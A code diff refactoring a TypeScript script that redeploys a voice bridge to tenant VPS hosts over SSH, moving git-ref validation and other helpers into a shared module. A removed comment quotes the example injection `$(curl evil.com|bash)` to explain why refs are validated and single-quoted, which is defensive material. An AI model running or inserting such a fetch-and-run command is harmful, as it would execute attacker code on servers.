@@ -37,7 +37,7 @@
  *
  * Required env (caller must export or pre-load `.env`, e.g.
  * `set -a; source .env; set +a; npx tsx scripts/redeploy-voice-bridge.ts`):
- *   SUPABASE_URL + SUPABASE_SERVICE_ROLE_KEY  — pull (business, ssh_key)
+ *   NEXT_PUBLIC_SUPABASE_URL (or SUPABASE_URL as alias), SUPABASE_SERVICE_ROLE_KEY
  *   HOSTINGER_API_TOKEN                        — resolve VPS public IP
  *
  * Exit codes:
@@ -46,74 +46,17 @@
  *   2  — bad CLI args or missing env
  */
 import { getActiveVpsSshKeyForBusiness } from "@/lib/db/vps-ssh-keys";
-import { createSupabaseServiceClient } from "@/lib/supabase/server";
 import { sshExec } from "@/lib/hostinger/ssh";
-import { HostingerClient, DEFAULT_HOSTINGER_BASE_URL } from "@/lib/hostinger/client";
-
-type Args = {
-  ref: string;
-  businessId: string | null;
-  json: boolean;
-};
-
-/**
- * Validate a git ref against the loose-but-safe set of characters git
- * itself documents as legal in branch / tag names: alphanumerics, plus
- * `-`, `_`, `.`, `/`. Crucially excludes `$`, backticks, single/double
- * quotes, and whitespace — those are the only metacharacters bash
- * could expand inside the SSH command, and the empty intersection
- * means we can safely interpolate the ref into any quoting context on
- * the remote shell.
- *
- * Bugbot Medium on PR #74 flagged the previous `JSON.stringify(ref)`
- * approach because bash double-quoted values still expand `$(...)`
- * and backticks, so a ref like `$(curl evil.com|bash)` would have
- * executed on every tenant VPS via SSH.
- */
-function assertSafeGitRef(ref: string): void {
-  if (!/^[A-Za-z0-9._/-]+$/.test(ref) || ref.startsWith("-") || ref.includes("..")) {
-    throw new Error(
-      `unsafe git ref ${JSON.stringify(ref)}: must match /^[A-Za-z0-9._/-]+$/, not start with '-', and not contain '..'`
-    );
-  }
-}
-
-function parseArgs(argv: string[]): Args {
-  const out: Args = { ref: "main", businessId: null, json: false };
-  for (let i = 0; i < argv.length; i += 1) {
-    const a = argv[i];
-    if (a === "--ref") out.ref = argv[++i] ?? "main";
-    else if (a === "--business") out.businessId = argv[++i] ?? null;
-    else if (a === "--json") out.json = true;
-    else if (a === "--help" || a === "-h") {
-      process.stdout.write(
-        "Usage: tsx scripts/redeploy-voice-bridge.ts [--ref main] [--business <uuid>] [--json]\n"
-      );
-      process.exit(0);
-    }
-  }
-  assertSafeGitRef(out.ref);
-  return out;
-}
-
-type TenantTarget = {
-  businessId: string;
-  hostingerVpsId: string;
-};
-
-async function listTargets(businessId: string | null): Promise<TenantTarget[]> {
-  const supabase = await createSupabaseServiceClient();
-  let q = supabase
-    .from("businesses")
-    .select("id, hostinger_vps_id")
-    .not("hostinger_vps_id", "is", null);
-  if (businessId) q = q.eq("id", businessId);
-  const { data, error } = await q;
-  if (error) throw new Error(`listTargets: ${error.message}`);
-  return ((data ?? []) as Array<{ id: string; hostinger_vps_id: string | null }>)
-    .filter((r) => typeof r.hostinger_vps_id === "string" && r.hostinger_vps_id.length > 0)
-    .map((r) => ({ businessId: r.id, hostingerVpsId: r.hostinger_vps_id as string }));
-}
+import {
+  assertSafeGitRef,
+  listTenantVpsTargets,
+  parseTenantVpsRedeployArgs,
+  resolveTenantVpsPublicIp,
+  requireServiceRoleAndHostingerToken,
+  ensureNextPublicSupabaseUrlOrExit,
+  type TenantVpsRedeployResult,
+  type TenantVpsTarget
+} from "./lib/redeploy-tenant-vps";
 
 /**
  * The exact bash run over SSH. Mirrors the bridge sync block of
@@ -122,17 +65,7 @@ async function listTargets(businessId: string | null): Promise<TenantTarget[]> {
  * rotations stay confined to the full deploy path.
  */
 function buildBridgeRedeployCommand(ref: string): string {
-  // Defence-in-depth: parseArgs() already enforces /^[A-Za-z0-9._/-]+$/
-  // (no shell metachars), but re-assert here so this builder remains
-  // safe for any future caller that bypasses parseArgs.
   assertSafeGitRef(ref);
-  // Wrap the ref in SINGLE quotes so bash performs zero expansion on
-  // it. Bash double-quotes still expand `$(...)` and backticks, which
-  // is why the previous JSON.stringify approach was unsafe (Bugbot
-  // Medium on PR #74). Combined with the assertSafeGitRef above —
-  // which excludes `'` from the allowed character set — single
-  // quoting is unambiguous: there is no way the literal could close
-  // the surrounding `'` and re-open command-substitution.
   return `set -euo pipefail
 NEWCOWORKER_REPO_PATH="/opt/newcoworker-repo"
 NEWCOWORKER_REPO_REF='${ref}'
@@ -186,38 +119,12 @@ exit 1
 `;
 }
 
-async function resolvePublicIp(hostingerVpsId: string, token: string): Promise<string | null> {
-  const client = new HostingerClient({
-    baseUrl: process.env.HOSTINGER_API_BASE_URL ?? DEFAULT_HOSTINGER_BASE_URL,
-    token
-  });
-  try {
-    const vm = await client.getVirtualMachine(Number(hostingerVpsId));
-    return vm.ipv4?.[0]?.address ?? null;
-  } catch (err) {
-    process.stderr.write(
-      `[redeploy-bridge] hostinger getVirtualMachine ${hostingerVpsId} failed: ${err instanceof Error ? err.message : String(err)}\n`
-    );
-    return null;
-  }
-}
-
-type TenantResult = {
-  businessId: string;
-  hostingerVpsId: string;
-  ok: boolean;
-  publicIp?: string;
-  exitCode?: number;
-  detail?: string;
-  stdoutTail?: string;
-};
-
-async function redeployOne(target: TenantTarget, ref: string, hostingerToken: string): Promise<TenantResult> {
+async function redeployOne(target: TenantVpsTarget, ref: string, hostingerToken: string): Promise<TenantVpsRedeployResult> {
   const key = await getActiveVpsSshKeyForBusiness(target.businessId);
   if (!key) {
     return { ...target, ok: false, detail: "no_active_ssh_key" };
   }
-  const publicIp = await resolvePublicIp(target.hostingerVpsId, hostingerToken);
+  const publicIp = await resolveTenantVpsPublicIp(target.hostingerVpsId, hostingerToken, "[redeploy-bridge]");
   if (!publicIp) {
     return { ...target, ok: false, detail: "no_public_ip" };
   }
@@ -229,9 +136,6 @@ async function redeployOne(target: TenantTarget, ref: string, hostingerToken: st
       username: key.ssh_username,
       privateKeyPem: key.private_key_pem,
       command,
-      // 5 minutes — `docker compose build` rebuilds the bridge image
-      // from source on each run; the layer cache makes subsequent
-      // builds ~30s but a cold path can hit 2-3 minutes on a small VPS.
       timeoutMs: 300_000
     });
     const stdoutTail = (result.stdout || "").split("\n").slice(-15).join("\n");
@@ -257,22 +161,14 @@ async function redeployOne(target: TenantTarget, ref: string, hostingerToken: st
 }
 
 async function main(): Promise<void> {
-  const args = parseArgs(process.argv.slice(2));
-  if (!process.env.SUPABASE_URL && !process.env.NEXT_PUBLIC_SUPABASE_URL) {
-    process.stderr.write("missing SUPABASE_URL / NEXT_PUBLIC_SUPABASE_URL\n");
-    process.exit(2);
-  }
-  if (!process.env.SUPABASE_SERVICE_ROLE_KEY) {
-    process.stderr.write("missing SUPABASE_SERVICE_ROLE_KEY\n");
-    process.exit(2);
-  }
-  const hostingerToken = process.env.HOSTINGER_API_TOKEN ?? "";
-  if (!hostingerToken) {
-    process.stderr.write("missing HOSTINGER_API_TOKEN\n");
-    process.exit(2);
-  }
+  const args = parseTenantVpsRedeployArgs(
+    process.argv.slice(2),
+    "Usage: tsx scripts/redeploy-voice-bridge.ts [--ref main] [--business <uuid>] [--json]\n"
+  );
+  ensureNextPublicSupabaseUrlOrExit();
+  const hostingerToken = requireServiceRoleAndHostingerToken();
 
-  const targets = await listTargets(args.businessId);
+  const targets = await listTenantVpsTargets(args.businessId);
   if (targets.length === 0) {
     process.stdout.write(
       args.businessId
@@ -282,7 +178,7 @@ async function main(): Promise<void> {
     process.exit(0);
   }
 
-  const results: TenantResult[] = [];
+  const results: TenantVpsRedeployResult[] = [];
   for (const t of targets) {
     process.stderr.write(`\n=== ${t.businessId} (vps=${t.hostingerVpsId}) ===\n`);
     const r = await redeployOne(t, args.ref, hostingerToken);
